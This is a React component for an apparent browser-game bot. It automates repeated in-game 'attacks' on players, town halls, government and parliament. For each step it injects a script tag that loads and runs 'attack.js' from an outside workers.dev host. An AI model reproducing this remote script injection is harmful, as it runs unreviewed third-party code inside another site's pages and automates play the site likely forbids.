import React, { useState, useEffect } from "react";
import AttackModal from "./attacks/AttackModal";
import LiquidGlassAttackDial from "./ui/LiquidGlassAttackDial";
import AttackProgressCard from "./attacks/AttackProgressCard";

import { STORAGE_KEY } from "@/constants/attacks";
import targets from "../data/attackTargets.json";

export default function DraculaGUI() {
    const [attackType, setAttackType] = useState(null);

    const getServerKey = () => window.location.hostname.toLowerCase();

    // ----------------------------------------------------
    // Primarie rotator
    // ----------------------------------------------------
    const getNextPrimarieId = (list) => {
        let state = JSON.parse(localStorage.getItem(STORAGE_KEY)) || {};
        let idx = state.primarieIndex || 0;

        const id = list[idx].id;

        idx = (idx + 1) % list.length;
        state.primarieIndex = idx;

        localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
        return id;
    };

    // ----------------------------------------------------
    // Resolve target ID
    // ----------------------------------------------------
    const resolveTargetId = (config) => {
        const server = getServerKey();
        const cfg = targets[server];
        if (!cfg) return 30;

        switch (config.category) {
            case "players":
                return null;
            case "primarii":
                return getNextPrimarieId(cfg.primarii);
            case "government":
                return cfg.guvern.id;
            case "parliament":
                return cfg.parlament.id;
            default:
                return 30;
        }
    };

    // ----------------------------------------------------
    // Start attack
    // ----------------------------------------------------
    const executeAttack = (payload) => {
        let state = {
            remaining: payload.pub_attack || payload.max_count || 1,
            total: payload.pub_attack || payload.max_count || 1,
            index: 1,
            primarieIndex: 0,
            config: payload,
            lastTargetId: null,
        };

        localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
        runNextAttack();
    };

    // ----------------------------------------------------
    // Perform ONE attack step (with refresh protection)
    // ----------------------------------------------------
    const runNextAttack = () => {
        let saved = JSON.parse(localStorage.getItem(STORAGE_KEY));
        if (!saved || saved.remaining <= 0) return;

        const p = saved.config;
        const idx = saved.index;

        let DRACI = 0;
        let PREOTI = 0;

        const server = getServerKey();
        const cfg = targets[server];

        // --------- FIX: TARGET ID is locked per attack step ---------
        let TARGET;

        if (saved.lastTargetId) {
            TARGET = saved.lastTargetId; // Same as last time (refresh-safe)
        } else {
            TARGET = resolveTargetId(p);
        }

        // --------- Resolve target name safely ---------
        let targetName = "Unknown";

        if (p.category === "players") {
            targetName = p.player_name || "Player";

        } else if (p.category === "primarii") {
            const list = cfg.primarii;

            // FIX: correct index (use pre-increment logical position)
            const realIdx =
                (saved.primarieIndex - 1 + list.length) % list.length;

            const primarie = list[realIdx];
            targetName = primarie?.name || "Primărie";

        } else if (p.category === "government") {
            targetName = cfg.guvern.name;

        } else if (p.category === "parliament") {
            targetName = cfg.parlament.name;
        }

        // --------- DRACI / PREOTI logic ---------
        if (p.category === "players" || p.category === "primarii") {
            DRACI = p.draci;
            PREOTI = p.preoti;
        } else {
            const isLoss = idx % 2 === 1;
            DRACI = isLoss ? p.draci_loss : p.draci_win;
            PREOTI = isLoss ? p.preoti_loss : p.preoti_win;
        }

        // --------- Inject remote attack script ---------
        const url =
            "https://wispy-wildflower-4418.thoe2dev.workers.dev/attack.js" +
            `?draci=${DRACI}` +
            `&preoti=${PREOTI}` +
            (TARGET ? `&target=${TARGET}` : "") +
            `&cb=${Math.random()}`;

        const s = document.createElement("script");
        s.src = url;
        document.body.appendChild(s);

        // --------- Update state ---------
        let updated = JSON.parse(localStorage.getItem(STORAGE_KEY));
        updated.remaining -= 1;
        updated.index += 1;

        updated.currentTargetName = targetName;
        updated.lastTargetId = TARGET; // 🔥 keeps target stable after refresh

        // Reset lastTargetId only after this attack is done
        if (updated.remaining <= 0) {
            updated.lastTargetId = null;
        }

        localStorage.setItem(STORAGE_KEY, JSON.stringify(updated));
    };

    // ----------------------------------------------------
    // Refresh continuation
    // ----------------------------------------------------
    useEffect(() => {
        const saved = JSON.parse(localStorage.getItem(STORAGE_KEY));
        if (saved && saved.remaining > 0) {
            runNextAttack();
        } else {
            localStorage.removeItem(STORAGE_KEY);
        }
    }, []);

    return (
        <>
            <LiquidGlassAttackDial onOpen={setAttackType} />

            <AttackModal
                type={attackType}
                open={!!attackType}
                onClose={() => setAttackType(null)}
                onSubmit={executeAttack}
            />

            <AttackProgressCard />
        </>
    );
}
